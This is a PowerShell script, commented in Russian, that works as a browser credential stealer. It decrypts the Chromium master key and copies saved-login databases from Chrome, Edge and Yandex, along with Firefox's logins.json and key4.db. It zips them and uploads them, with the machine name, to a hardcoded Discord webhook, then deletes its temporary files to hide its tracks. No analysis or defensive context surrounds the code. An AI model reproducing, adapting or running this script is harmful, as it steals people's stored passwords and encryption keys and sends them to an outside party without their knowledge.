# [ Конфигурация ]
$hookUrl = "https://discordapp.com/api/webhooks/1500921789273083906/Lo-Y6cSsllkNinCRaaCVj9Kttd27D_D8jLAC2cwZVvHvMQ5b87GqfM8oNrEtwxxTIyKt"
$tempDir = "$env:TEMP\sys_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
$logPath = "$tempDir\report.log"

Add-Type -AssemblyName System.Security

function Get-Key($statePath, $label) {
    if (Test-Path $statePath) {
        try {
            $json = Get-Content $statePath -Raw | ConvertFrom-Json
            $rawKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($rawKey[5..($rawKey.Length-1)], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            "[$($label)] Key: $([Convert]::ToBase64String($masterKey))" | Out-File -FilePath $logPath -Append -Encoding UTF8
            return $true
        } catch { return $false }
    }
    return $false
}

# 1. CHROMIUM
$browsers = @(
    @{name="Chrome"; path="Google\Chrome\User Data"},
    @{name="Edge"; path="Microsoft\Edge\User Data"},
    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $userData = Join-Path $env:LOCALAPPDATA $b.path
    if (Test-Path $userData) {
        Get-ChildItem -Path $userData -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
            $currentFile = $_
            $label = "$($b.name)_$($currentFile.Directory.Name)"
            if (Get-Key (Join-Path $userData "Local State") $label) {
                Copy-Item $currentFile.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# 2. FIREFOX (Исправленный блок)
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    Get-ChildItem -Path $ffPath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        $profile = $_ # Сохраняем объект профиля, чтобы он не затерялся
        $label = "FF_$($profile.Name)"
        "logins.json", "key4.db", "cert9.db" | ForEach-Object {
            $fileName = $_ # Это имя файла (напр. logins.json)
            $f = Join-Path $profile.FullName $fileName # Теперь тут точно не будет NULL
            if (Test-Path $f) { 
                Copy-Item $f -Destination "$tempDir\$($label)_$fileName" -Force -ErrorAction SilentlyContinue 
            }
        }
    }
}

# 3. УПАКОВКА И ОТПРАВКА
if ((Get-ChildItem $tempDir).Count -gt 0) {
    $zipPath = "$env:TEMP\rep_$(Get-Random).zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force

    try {
        $client = New-Object System.Net.Http.HttpClient
        $content = New-Object System.Net.Http.MultipartFormDataContent
        $fileStream = [System.IO.File]::OpenRead($zipPath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $content.Add($fileContent, "file", "report.zip")
        $content.Add((New-Object System.Net.Http.StringContent("Protocol 81: $env:COMPUTERNAME")), "content")
        $response = $client.PostAsync($hookUrl, $content).Result
        $fileStream.Close(); $fileStream.Dispose(); $content.Dispose(); $client.Dispose()
    } catch {}

    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
}
Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
